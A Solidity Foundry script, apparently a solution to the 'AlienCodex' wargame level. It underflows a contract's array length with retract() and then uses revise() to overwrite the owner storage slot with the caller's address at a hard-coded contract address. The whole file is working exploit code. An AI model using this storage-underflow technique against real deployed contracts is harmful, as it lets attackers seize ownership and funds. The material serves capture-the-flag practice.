// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "../src/Attacker.sol";
//import "../src/Contract.sol";
import "forge-std/console.sol";

interface AlienCodex {
    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract AttackScript is Script {
    function setUp() public {
        vm.startBroadcast();
    }

    function run() external {
        AlienCodex alienCodex = AlienCodex(
            0x68dADC99d4D1Dc5db4E9998C6292e380318eA658
        );

        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

        // increase address size from 20 bytes to 32.
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));

        alienCodex.makeContact();
        // do this to cause array storage to underflow
        alienCodex.retract();

        // add new value to the storage slot for owner, contact
        alienCodex.revise(index, myAddress);
        vm.stopBroadcast();
    }
}
